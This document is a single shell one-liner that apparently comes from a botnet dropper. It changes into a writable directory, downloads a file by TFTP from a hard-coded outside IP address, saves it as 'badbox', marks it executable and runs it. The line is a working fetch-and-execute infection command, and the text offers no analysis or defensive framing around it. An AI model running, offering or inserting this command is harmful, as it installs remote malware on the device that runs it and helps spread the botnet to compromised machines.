cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 51.15.39.162 -c get pftp;cat pftp >badbox;chmod +x *;./badbox
